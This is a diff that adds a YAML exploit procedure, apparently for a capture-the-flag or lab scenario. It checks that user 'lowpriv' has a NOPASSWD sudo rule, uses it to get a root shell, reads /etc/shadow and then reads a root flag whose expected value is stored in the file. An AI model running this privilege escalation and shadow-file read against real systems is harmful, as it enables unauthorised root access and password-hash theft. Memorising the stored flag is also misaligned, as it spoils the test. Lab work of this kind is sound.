@@ -1,0 +1,29 @@
+procedure:
+- action:
+    command: sudo -l -U lowpriv
+    type: exec_target
+  expect:
+    stdout_contains: NOPASSWD
+  outputs: {}
+  session: null
+  step_id: verify_sudo_misconfiguration
+  timeout: 10
+- action:
+    command: su -c 'sudo /bin/bash -c "id && cat /etc/shadow"' lowpriv
+    type: exec_target
+  expect:
+    stdout_contains: uid=0(root) gid=0(root) groups=0(root)
+  outputs: {}
+  session: null
+  step_id: exploit_sudo_bash
+  timeout: 10
+- action:
+    command: su -c 'sudo /bin/bash -c "cat /root/flag.txt"' lowpriv
+    type: exec_target
+  expect:
+    stdout_contains: FLAG{sudo_misconfiguration_pwned}
+  outputs: {}
+  session: null
+  step_id: read_root_flag
+  timeout: 10
+sessions: []
